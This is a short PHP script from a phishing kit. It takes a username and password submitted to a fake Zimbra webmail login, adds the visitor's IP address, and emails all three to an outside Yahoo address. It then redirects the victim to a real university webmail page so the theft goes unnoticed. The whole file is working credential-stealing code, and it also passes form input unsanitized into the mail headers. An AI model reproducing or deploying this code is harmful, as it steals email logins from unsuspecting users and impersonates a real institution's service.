<?

$ip = getenv("REMOTE_ADDR");
$message .= "---------\n";
$message .= "ZIMBRA: ".$_POST['a']."\n";
$message .= "Password: ".$_POST['b']."\n";
$message .= "IP: ".$ip."\n";
$message .= "--LOGS--\n";




$recipient = "awatoreric@yahoo.com";
$subject = "$ip";
$headers = "From: $ip";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location:http://webmail.cetmic.unlp.edu.ar/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>